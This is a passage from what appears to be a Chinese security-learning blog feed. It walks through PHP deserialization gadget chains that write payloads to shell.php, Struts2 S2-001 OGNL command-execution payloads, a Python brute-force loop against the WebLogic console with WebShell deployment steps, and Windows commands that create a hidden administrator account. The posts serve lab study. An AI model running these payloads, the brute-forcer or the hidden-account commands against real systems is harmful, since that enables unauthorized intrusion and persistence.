class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>



<p>同目录下有个空的shell.php文件。一开始访问index.php。</p>
<p>基本的思路是，本地搭建好环境，通过 serialize() 得到我们要的序列化字符串，之后再传进去。通过源代码知，把对象中的test值赋为 “&lt;?php phpinfo(); &gt;”,再调用unserialize()时会通过__wakeup()把test的写入到shell.php中。为此我们写个php脚本：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>class virusday&#123;	</span><br><span class="line">    <span class="keyword">var</span> $test = <span class="string">'123'</span>;	</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;		</span><br><span class="line">        $fp = fopen(<span class="string">"shell.php"</span>,<span class="string">"w"</span>) ;		</span><br><span class="line">        fwrite($fp,<span class="keyword">$this</span>-&gt;test);		</span><br><span class="line">        fclose($fp);	</span><br><span class="line">    &#125;</span><br><span class="line">&#125;$class4 = <span class="keyword">new</span> virusday();</span><br><span class="line">$class4-&gt;test = <span class="string">"&lt;?php phpinfo(); ?&gt;"</span>;	</span><br><span class="line">$class4_ser = serialize($class4);	</span><br><span class="line">print_r($class4_ser);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p>由此得到序列化结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:8:&quot;virusday&quot;:1:&#123;s:4:&quot;test&quot;;s:19:&quot;&lt;?php phpinfo(); ?&gt;&quot;;&#125;</span><br></pre></td></tr></table></figure>

<h4 id="其他Magic-function的利用"><a href="#其他Magic-function的利用" class="headerlink" title="其他Magic function的利用"></a>其他Magic function的利用</h4><p>但如果一次unserialize()中并不会直接调用的魔术函数，比如前面提到的<strong>construct()，是不是就没有利用价值呢？非也。类似于PWN中的ROP，有时候反序列化一个对象时，由它调用的</strong>wakeup()中又去调用了其他的对象，由此可以溯源而上，利用一次次的“gadget”找到漏洞点。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">creeper</span></span>&#123;	</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($test)</span></span>&#123;		</span><br><span class="line">        $fp = fopen(<span class="string">"shell.php"</span>,<span class="string">"w"</span>) ;		</span><br><span class="line">        fwrite($fp,$test);		</span><br><span class="line">        fclose($fp);	</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">virusday</span></span>&#123;	</span><br><span class="line">    <span class="keyword">var</span> $test = <span class="string">'123'</span>;	</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;		</span><br><span class="line">        $obj = <span class="keyword">new</span> creeper(<span class="keyword">$this</span>-&gt;test);	</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$class5 = $_GET[<span class="string">'test'</span>];</span><br><span class="line">print_r($class5);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">$class5_unser = unserialize($class5);</span><br><span class="line"><span class="keyword">require</span> <span class="string">"shell.php"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p>这里我们给test传入构造好的序列化字符串后，进行反序列化时自动调用__wakeup()函数 ，从而在new creeper()会自动调用对象creeper中的 __construct()方法，从而把<code>&lt;?php phpinfo(); ?&gt;</code>写入到 shell.php中。</p>
<p>传参：?test=O:8:”virusday”:1:{s:4:”test”;s:19:&quot;&lt;?php phpinfo(); ?&gt;&quot;;}</p>
<h2 id="利用普通成员方法"><a href="#利用普通成员方法" class="headerlink" title="利用普通成员方法"></a>利用普通成员方法</h2><p>前面谈到的利用都是基于“自动调用”的magic function。但当漏洞/危险代码存在类的普通方法中，就不能指望通过“自动调用”来达到目的了。这时的利用方法如下，<strong>寻找相同的函数名，把敏感函数和类联系在一起</strong>。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">virusday</span> </span>&#123;    </span><br><span class="line">    <span class="keyword">var</span> $test;    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;        </span><br><span class="line">        <span class="keyword">$this</span>-&gt;test = <span class="keyword">new</span> creeper1();    </span><br><span class="line">    &#125;    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;        </span><br><span class="line">        <span class="keyword">$this</span>-&gt;test-&gt;action();    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">creeper1</span> </span>&#123;    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span><span class="params">()</span> </span>&#123;        </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"creeper1"</span>;    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">creeper2</span> </span>&#123;    </span><br><span class="line">    <span class="keyword">var</span> $test2;    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span><span class="params">()</span> </span>&#123;        </span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;test2);    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$class6 = <span class="keyword">new</span> virusday();</span><br><span class="line">unserialize($_GET[<span class="string">'test'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p>本意上，new一个新的chybeta对象后，调用__construct()，其中又new了creeper1对象。在结束后会调用__destruct()，其中会调用action()，从而输出 creeper1。</p>
<p>下面是利用过程。构造序列化。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">virusday</span> </span>&#123;    </span><br><span class="line">    <span class="keyword">var</span> $test;    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;        </span><br><span class="line">        <span class="keyword">$this</span>-&gt;test = <span class="keyword">new</span> creeper2();    <span class="comment">#test变量指向creeper2的对象实例</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">creeper2</span> </span>&#123;    </span><br><span class="line">    <span class="keyword">var</span> $test2 = <span class="string">"phpinfo();"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="keyword">new</span> virusday());</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p>得到：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:8:&quot;virusday&quot;:1:&#123;s:4:&quot;test&quot;;O:7:&quot;creeper2&quot;:1:&#123;s:5:&quot;test2&quot;;s:10:&quot;phpinfo();&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure>



<p>传给index.php的test参数，利用成功</p>
<h4 id="toString魔术方法"><a href="#toString魔术方法" class="headerlink" title="toString魔术方法"></a>toString魔术方法</h4><p>其中特别说明一下第四点：</p>
<p>这个 __toString 触发的条件比较多，也因为这个原因容易被忽略，常见的触发条件有下面几种</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(1)echo ($obj) &#x2F; print($obj) 打印时会触发</span><br><span class="line"></span><br><span class="line">(2)反序列化对象与字符串连接时 （.连接）</span><br><span class="line"></span><br><span class="line">(3)反序列化对象参与格式化字符串时（sprintf() 函数把格式化的字符串写入变量中。格式化其中的变量再返回已格式化的字符串）</span><br><span class="line"></span><br><span class="line">(4)反序列化对象与字符串进行&#x3D;&#x3D;比较时（PHP进行&#x3D;&#x3D;比较的时候会转换参数类型）</span><br><span class="line"></span><br><span class="line">(5)反序列化对象参与格式化SQL语句，绑定参数时（bind_param()）</span><br><span class="line"></span><br><span class="line">(6)反序列化对象在经过php字符串函数，如 strlen()、addslashes()时</span><br><span class="line"></span><br><span class="line">(7)在in_array()方法中，第一个参数是反序列化对象，第二个参数的数组中有toString返回的字符串的时候toString会被调用</span><br><span class="line"></span><br><span class="line">(8)反序列化的对象作为 class_exists() 的参数的时候</span><br></pre></td></tr></table></figure>







<h2 id="php字符串拼接"><a href="#php字符串拼接" class="headerlink" title="php字符串拼接"></a>php字符串拼接</h2><h3 id="字符串的表示"><a href="#字符串的表示" class="headerlink" title="字符串的表示"></a>字符串的表示</h3><p>PHP中字符串的表示可以用双引号，也可以用单引号，但是两者之间有些区别。</p>
<ul>
<li>字符串中有变量的时候，<strong>单引号仅输出变量名</strong>，而不是值：</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="number">2</span> $color = <span class="string">"red"</span>;</span><br><span class="line"><span class="number">3</span> <span class="keyword">echo</span> <span class="string">"Roses are$color"</span>;</span><br><span class="line"><span class="number">4</span> <span class="keyword">echo</span> <span class="string">"&lt;br /&gt;"</span>;</span><br><span class="line"><span class="number">5</span> <span class="keyword">echo</span> <span class="string">'Roses are $color'</span>;</span><br><span class="line"><span class="number">6</span> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>输出：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">Roses are red</span><br><span class="line">Roses are $color #注意此处只输出变量名</span><br></pre></td></tr></table></figure>



<ul>
<li>转义字符：</li>
</ul>
<p>　　　　“\t”  输出时就是制表符， 而‘\t’ 就是直接输出 \t 了。　　</p>
<p>　　　　在window下 “\r\n” 是表示换行。</p>
<ul>
<li>此外，在PHP中要输出一个换行的时候，只能用“<br>”，可能这也是它与HTML语言高度结合的结果吧</li>
</ul>
<h3 id="字符串的拼接（连接符）"><a href="#字符串的拼接（连接符）" class="headerlink" title="字符串的拼接（连接符）"></a>字符串的拼接（连接符）</h3><h3 id="php变量和字符串连接符——点（-）"><a href="#php变量和字符串连接符——点（-）" class="headerlink" title="php变量和字符串连接符——点（.）"></a>php变量和字符串连接符——点（.）</h3><p> 连接符——点，本身也是一种运算符。它真正的名字应该叫<strong>“字符运算符”</strong>。作用是把两个字符串连接起来。 </p>
<p><strong>echo 字符 . 变量 . 字符;</strong> </p>
<p>//点号把三个值连接成为一个，运行正常。</p>
<p>例：</p>
<p>1.字符串+变量+字符串</p>
<p><code>echo(&quot;&lt;!--&quot;.$result.&quot;--&gt;&quot;);</code></p>
<p>2.变量+变量<br><code>echo($result.$result);</code></p>
<p>3.字符串+变量<br><code>echo(&quot;a&quot;.$result);</code></p>
<p> 当然还有其他输出方式:print 以及printf（用于控制输出格式）。但是<strong>echo的输出速度是最快的</strong>。 </p>
<h3 id="字符串处理函数"><a href="#字符串处理函数" class="headerlink" title="字符串处理函数"></a>字符串处理函数</h3><p>PHP也提供与其他语言类似的字符串处理函数，常用的有：</p>
<p>chr() 　　　　　　　　  从指定的 ASCII 值返回字符。（注意不是charAt）</p>
<p>explode() 　　　　　　 把字符串打散为数组。</p>
<p>str_ireplace() 　　　　 替换字符串中的一些字符。（对大小写不敏感）</p>
<p>str_word_count() 　　计算字符串中的单词数。</p>
<p>strip_tags() 　　　　　剥去 HTML、XML 以及 PHP 的标签。</p>
<p>stripos() 　　　　　　 返回字符串在另一字符串中第一次出现的位置(大小写不敏感)</p>
<p>strlen()　　　　　　　  返回字符串的长度。</p>
]]></content>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>test</title>
    <url>/2020/11/06/test/</url>
    <content><![CDATA[<p><img src="/2020/11/06/test/.%5Ctest%5Cimage-20201106235631276.png" alt="image-20201106235631276"></p>
]]></content>
  </entry>
  <entry>
    <title>strust2 vulhub漏洞复现/strust2 vulhub漏洞复现</title>
    <url>/2020/11/09/strust2%20vulhub%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/strust2%20vulhub%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>为了更好的做铺垫 之前学习了spring框架，再去看了mvc架构，简单学习了一下spring mvc之后转手去看strust2的设计思路以及OGNL的简单用法，现在结合着strusts的漏洞进一步学习了解</p>
<p>目前仍然需要学习：</p>
<ol>
<li>熟悉J2EE开发, 主要是JSP开发</li>
<li>了解Struts2框架执行流程</li>
<li>了解Ognl表达式</li>
</ol>
<p>为weblogic等中间件反序列化做准备</p>
<h2 id="S2-001-远程代码执行漏洞"><a href="#S2-001-远程代码执行漏洞" class="headerlink" title="S2-001 远程代码执行漏洞"></a>S2-001 远程代码执行漏洞</h2><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>Struts 2.0.0 - Struts 2.0.8</p>
<h3 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h3><blockquote>
<p>该漏洞因为用户<strong>提交表单数据</strong>并且<strong>验证失败</strong>时，后端会将用户之前提交的参数值使用 <strong>OGNL 表达式 %{value} 进行解析</strong>，然后<strong>重新填充到对应的表单数据</strong>中。例如注册或登录页面，提交失败后端一般会默认返回之前提交的数据，由于后端使用 %{value} 对提交的数据执行了一次 OGNL 表达式解析，所以可以<strong>直接构造 Payload 进行命令执行</strong></p>
</blockquote>
<h3 id="漏洞原理："><a href="#漏洞原理：" class="headerlink" title="漏洞原理："></a>漏洞原理：</h3><p>Struts 2 框架的表单验证机制（ Validation机制 ）主要依赖于两个拦截器(interceptor)：validation 和 workflow。</p>
<p>validation 拦截器工作时，会根据 XML 配置文件来<strong>创建一个验证错误列表</strong>；workflow 拦截器工作时，会根据 validation 拦截器所提供的验证错误列表，来检查当前所提交的表单<strong>是否存在验证错误</strong>。</p>
<p>在默认配置下，如果 workflow 拦截器检测到用户所提交的表单存在任何一个验证错误，workflow 拦截器都会将用户的输入进行解析处理，随即返回并显示处理结果。(即<strong>存在触发表单验证错误，服务器返回解析处理结果到客户端</strong>)</p>
<p>那么问题出在哪里呢？我们再来了解 Struts 2 框架中的一个标签处理功能： altSyntax。</p>
<p>问题是出在textfield自定义标签里end方法。</p>
<p>altSyntax 功能是 Struts 2 框架用于处理标签内容的一种新语法（不同于普通的 HTML ），该功能主要作用在于<strong>支持对标签中的 OGNL 表达式进行解析并执行</strong>。会调用translateVariables方法对标签中表单名进行OGNL表达式<strong>递归解析返回ValueStack值栈中同名属性的值</strong>。因此我们可以构造特定的表单值让其进行OGNL表达式解析从而达到任意代码执行。</p>
<p>ValueStack是Struts2的一个接口，字面意义为值栈，类似于一个数据中转站，Struts2的数据都保存在ValueStack中。客户端发起一个请求struts2会创建一个Action实例同时创建一个OgnlValueStack值栈实例，OgnlValueStack贯穿整个Action的生命周期。Struts2中使用OGNL将请求Action的参数封装为对象存储到值栈中，并通过OGNL表达式读取值栈中的对象属性值</p>
<h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><p>该项目根据别人的项目修改而来，增加了logging模块打印错误的调用堆栈方法，忽略了不安全的https链接，让渗透中更方便测试，项目地址：<a href="https://github.com/Virusday/struct2scan_ignore_sslexpired/tree/master" target="_blank" rel="noopener">https://github.com/Virusday/struct2scan_ignore_sslexpired/tree/master</a></p>
<p><img src="/2020/11/09/strust2%20vulhub%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/strust2%20vulhub%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/.%5Cimage-20201113194154007.png" alt="image-20201113194154007"></p>
<h3 id="poc"><a href="#poc" class="headerlink" title="poc:"></a>poc:</h3><figure class="highlight"><table><tr><td class="code"><pre><span class="line">%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;"pwd"&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight"><table><tr><td class="code"><pre><span class="line">%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;"pwd"&#125;)).redirectErrorStream(true).start(),#d=new java.io.BufferedReader(new java.io.InputStreamReader(#a.getInputStream())),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</span><br></pre></td></tr></table></figure>

<h3 id="本地搭建"><a href="#本地搭建" class="headerlink" title="本地搭建:"></a>本地搭建:</h3><p>花了好几天时间学习struts2-ognl表达式，mvc设计模式，搭建环境，推荐以下几篇快速入门的好文章：</p>
<p><a href="http://zhengbao.wang/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8%E4%B9%8Bs2-001%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">环境搭建</a>这里我是配合了xampp</p>
<p><a href="https://juejin.im/post/6844903571444465677" target="_blank" rel="noopener">ognl设计缺陷</a></p>
<p><a href="https://blog.csdn.net/yewen1234/article/details/78376989" target="_blank" rel="noopener">拦截器浅析</a></p>
<p><a href="https://my.oschina.net/u/3647620/blog/1552443" target="_blank" rel="noopener">经典分析</a></p>
<p><a href="https://dean2021.github.io/posts/s2-001/" target="_blank" rel="noopener">s2-001详细分析</a></p>
<p><img src="/2020/11/09/strust2%20vulhub%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/strust2%20vulhub%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/.%5Cimage-20201113111640254.png" alt="image-20201113111640254"></p>
<p><img src="/2020/11/09/strust2%20vulhub%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/strust2%20vulhub%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/.%5Cimage-20201113111653704.png" alt="image-20201113111653704"></p>
<p>复现的环境。步骤网上有很多，在这里就不介绍了，进行愉快的调试。</p>
<p>首先ognl三要素：表达式，root对象，上下文环境。 strust2框架对接收过来的参数都进行ognl表达式的解析。</p>
<p><img src="/2020/11/09/strust2%20vulhub%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/strust2%20vulhub%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/.%5Cimage-20201113112332609.png" alt="image-20201113112332609"></p>
<p>Struts2采纳了XWork的一套完美方案(Xwork提供了很多核心功能：前端拦截机（interceptor），运行时表单属性验证，类型转换，强大的表达式语言（OGNL – the Object Graph Navigation Language），IoC（Inversion of Control反转控制）容器等). 并在此基础上构建一套所谓完美的机制,OGNL方案和OGNLValueStack机制.</p>
<p>在经过tomcat容器的处理后，http请求会到达struts2，首先经过前端拦截机ParameterInterceptor，完成数据转移、根据反射类型转换放入stackvalue。在xwork小于2.0.4版本中，这个类没有对参数进行安全过滤。</p>
<p>三要素当中，表达式和root对象在这里已经展示了，那么上下文环境是什么呢？在OGNL的内部，所有的操作都会在一个特定的环境中运行，这个环境就是OGNL的上下文环境（Context）。</p>
<p> OGNL的上下文环境<strong>是一个Map结构</strong>，称之为OgnlContext。上面我们提到的根对象（Root Object），事实上也会被加入到上下文环境中去，并且这将作为一个特殊的变量进行处理，具体就表现为针对根对象（Root Object）的存取操作的表达式是不需要增加#符号进行区分的。</p>
<p>Struts 2中的<strong>OGNL Context实现者为ActionContext</strong>，它结构示意图如下:</p>
<p><img src="https://user-gold-cdn.xitu.io/2018/3/8/162039b2ab90b78d?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="2013071900034178341.png"></p>
<p>当Struts2接受一个请求时，会迅速创建ActionContext，ValueStack（包含在ac里），action 。然后把action存放进ValueStack，所以action的实例变量（在actionmapping中）可以被OGNL访问。这里我们看看此次的上下文对象：</p>
<p><img src="/2020/11/09/strust2%20vulhub%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/strust2%20vulhub%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/.%5Cimage-20201113115553058.png" alt="image-20201113115553058"></p>
<p><img src="/2020/11/09/strust2%20vulhub%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/strust2%20vulhub%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/.%5Cimage-20201113115704304.png" alt="image-20201113115704304"></p>
<p>通过request接收请求的参数再将parameters放在上下文对象中，</p>
<p><img src="/2020/11/09/strust2%20vulhub%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/strust2%20vulhub%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/.%5Cimage-20201113120207229.png" alt="image-20201113120207229"></p>
<p>然后通过ac.getParameters()取出赋值给parameters</p>
<p><img src="/2020/11/09/strust2%20vulhub%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/strust2%20vulhub%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/C:%5CUsers%5CVirus%5CDesktop%5Cimage-20201113122925786.png" alt="image-20201113122925786"></p>
<p>套娃？</p>
]]></content>
  </entry>
  <entry>
    <title>weblogic入门/weblogic入门</title>
    <url>/2020/11/15/weblogic%E5%85%A5%E9%97%A8/weblogic%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<h1 id="WebLogic-入门"><a href="#WebLogic-入门" class="headerlink" title="WebLogic 入门"></a>WebLogic 入门</h1><h2 id="控制台路径泄露"><a href="#控制台路径泄露" class="headerlink" title="控制台路径泄露"></a>控制台路径泄露</h2><p>关于控制台，唯一的突破就是弱口令：</p>
<blockquote>
<p>相关地址：<a href="http://127.0.0.1:7001/console/login/LoginForm.jsp" target="_blank" rel="noopener">http://127.0.0.1:7001/console/login/LoginForm.jsp</a></p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">weakPasswd</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""weak password"""</span></span><br><span class="line"></span><br><span class="line">        pwddict = [<span class="string">'WebLogic'</span>, <span class="string">'weblogic'</span>, <span class="string">'Oracle@123'</span>, <span class="string">'password'</span>, <span class="string">'system'</span>, <span class="string">'Administrator'</span>, <span class="string">'admin'</span>, <span class="string">'security'</span>, <span class="string">'joe'</span>, <span class="string">'wlcsystem'</span>, <span class="string">'wlpisystem'</span>]</span><br><span class="line">        <span class="keyword">for</span> user <span class="keyword">in</span> pwddict:</span><br><span class="line">            <span class="keyword">for</span> pwd <span class="keyword">in</span> pwddict:</span><br><span class="line">                data = &#123;</span><br><span class="line">                    <span class="string">'j_username'</span>:user,</span><br><span class="line">                    <span class="string">'j_password'</span>:pwd,</span><br><span class="line">                    <span class="string">'j_character_encoding'</span>:<span class="string">'UTF-8'</span></span><br><span class="line">                &#125;</span><br><span class="line">                req = requests.post(self.url+<span class="string">':7001/console/j_security_check'</span>, data=data, allow_redirects=<span class="literal">False</span>, verify=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> req.status_code == <span class="number">302</span> <span class="keyword">and</span> <span class="string">'console'</span> <span class="keyword">in</span> req.text <span class="keyword">and</span> <span class="string">'LoginForm.jsp'</span> <span class="keyword">not</span> <span class="keyword">in</span> req.text:</span><br><span class="line">                    print(<span class="string">'[+] WebLogic username: '</span>+user+<span class="string">'  password: '</span>+pwd)</span><br></pre></td></tr></table></figure>

<p>漏洞修复建议是：如果远程部署功能的确需要，建议修改默认的模块名称。<br>如果一旦成功进入控制台，则我们可以使用weblogic的远程部署功能上传webshell。</p>
<h3 id="war包"><a href="#war包" class="headerlink" title="war包"></a>war包</h3><p>不习惯Java IDE，可在使用jar命令进行打包：</p>
<p><img src="/2020/11/15/weblogic%E5%85%A5%E9%97%A8/weblogic%E5%85%A5%E9%97%A8/.%5Cimage-20201115235530689.png" alt="image-20201115235530689"></p>
<p>改后缀名发现多一个目录。</p>
<p>然后借助控制台进行war包的远程部署：</p>
<p>可以通过以下模块对部署状态进行二次确认：</p>
<blockquote>
<p><a href="http://127.0.0.1:7001/wls-cat/index.jsp?action=summary&amp;app=ma&amp;module=ma.war" target="_blank" rel="noopener">http://127.0.0.1:7001/wls-cat/index.jsp?action=summary&amp;app=ma&amp;module=ma.war</a></p>
</blockquote>
<p><img src="/2020/11/15/weblogic%E5%85%A5%E9%97%A8/weblogic%E5%85%A5%E9%97%A8/.%5C11466123-e781cf83a5abc013.jpg" alt="img"></p>
<p>确认部署情况</p>
<p>部署完成后可通过项目部署路径访问webshell：</p>
<blockquote>
<p><a href="http://127.0.0.1:7001/ma/ma.jsp" target="_blank" rel="noopener">http://127.0.0.1:7001/ma/ma.jsp</a></p>
</blockquote>
]]></content>
  </entry>
  <entry>
    <title>web实战渗透测试/web实战渗透测试</title>
    <url>/2020/11/07/web%E5%AE%9E%E6%88%98%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/web%E5%AE%9E%E6%88%98%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</url>
    <content><![CDATA[<h2 id="Struct2-漏洞和PHP-admin批量拿网站shell"><a href="#Struct2-漏洞和PHP-admin批量拿网站shell" class="headerlink" title="Struct2 漏洞和PHP admin批量拿网站shell"></a>Struct2 漏洞和PHP admin批量拿网站shell</h2><p> Struct2 是apache项目下的一个web框架</p>
<p>phpmyadmin是一个以php为基础，以web-base方式架构在网站主机上的mysql的数据库管理工具，让管理者可以用web接口管理mysql数据库 ——弱口令批量拿shell</p>
<h3 id="Struct2"><a href="#Struct2" class="headerlink" title="Struct2"></a>Struct2</h3><p>url：.index.action结尾的struct2框架，用Struts2Scan.py 扫目标是否具有该漏洞。</p>
<p>详见另一篇strust2漏洞复现</p>
<h3 id="windows命令行"><a href="#windows命令行" class="headerlink" title="windows命令行"></a>windows命令行</h3><h4 id="1-1-用户账户与组账户"><a href="#1-1-用户账户与组账户" class="headerlink" title="1.1 用户账户与组账户"></a>1.1 用户账户与组账户</h4><p>用户帐户是对计算机用户<strong>身份的标识</strong>，本地用户帐户、密码存在本地计算机上，只对本机有效，存储在本地<strong>安全帐户数据库 SAM</strong> 中。</p>
<p>​    文件路径：<strong>C:\Windows\System32\config\SAM</strong> ，对应的进程：lsass.exe 。通过本地用户和组，可以<strong>为用户和组分配权利和权限</strong>，从而限制用户和组执行某些操作的能力。</p>
<ul>
<li>不同的用户身份拥有不同的权限</li>
<li>每个用户包含一个名称和一个密码</li>
<li>用户帐户拥有<strong>唯一的安全标识符</strong>(Security Identifier，SID)</li>
</ul>
<p>当我们去进程管理里面杀死 lsass.exe 进程时，windows会提示遇到错误，然后关机</p>
<h4 id="1-2-Windows-默认账户"><a href="#1-2-Windows-默认账户" class="headerlink" title="1.2 Windows 默认账户"></a>1.2 Windows 默认账户</h4><p>Windows 默认账户，用于特殊用途，一般不需更修改其权限</p>
<ul>
<li>与使用者关联的用户帐户 Administrator（管理员用户）</li>
<li>默认的管理员用户 Guest（来宾用户） 默认是禁用的</li>
</ul>
<h4 id="1-3-Windows-内置用户账户"><a href="#1-3-Windows-内置用户账户" class="headerlink" title="1.3 Windows 内置用户账户"></a>1.3 Windows 内置用户账户</h4><p>权限：System &gt; Administrator &gt; User &gt; Guest</p>
<p>与windows组件关联的用户账户：</p>
<ul>
<li>System (本地系统)：为<strong>windows的核心组件</strong>访问文件等资源提供权限</li>
<li>Local Service (本地服务)：预设的<strong>拥有最小权限</strong>的本地账户</li>
<li>Network Service (网络服务)：具有运行<strong>网络服务权限</strong>的计算机账户</li>
</ul>
<h4 id="1-4-查看用户的sid"><a href="#1-4-查看用户的sid" class="headerlink" title="1.4 查看用户的sid"></a>1.4 查看用户的sid</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">net user    查看当前用户</span><br><span class="line">whoami /user     查看系统当前用户的SID</span><br><span class="line">wmic useraccount get name,sid      查看所有用户的SID</span><br></pre></td></tr></table></figure>

<h4 id="1-5-查看、创建和删除账户"><a href="#1-5-查看、创建和删除账户" class="headerlink" title="1.5 查看、创建和删除账户"></a>1.5 查看、创建和删除账户</h4><p>使用命令查看、创建和删除账户(管理员权限，否则错误5 拒绝访问)：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">Copynet  user　　   查看系统账户</span><br><span class="line">net  user  v1rus    <span class="number">123</span>  /add        创建新用户xie，密码设置为 <span class="number">123</span></span><br><span class="line">net  user  hack<span class="variable">$</span>  <span class="number">123</span>  /add        创建隐藏用户hack，密码为<span class="number">123</span></span><br><span class="line">net  user  v1rus        查看账户xie的属性</span><br><span class="line">net  user  v1rus  v1rus.    将用户写的密码修改为x456.</span><br><span class="line">net  user  v1rus  /del    删除用户xie</span><br><span class="line">net  localgroup   administrators  v1rus    /add      将普通用户xie提权到管理员</span><br><span class="line">net  localgroup   administrators  v1rus<span class="variable">$</span>  /add      将隐藏用户hack提权到管理员</span><br><span class="line">net localgroup users 查看user用户组的成员，包括隐藏成员</span><br></pre></td></tr></table></figure>

<p><a href="https://www.cnblogs.com/-mo-/p/11890837.html" target="_blank" rel="noopener">参考这篇连接</a></p>
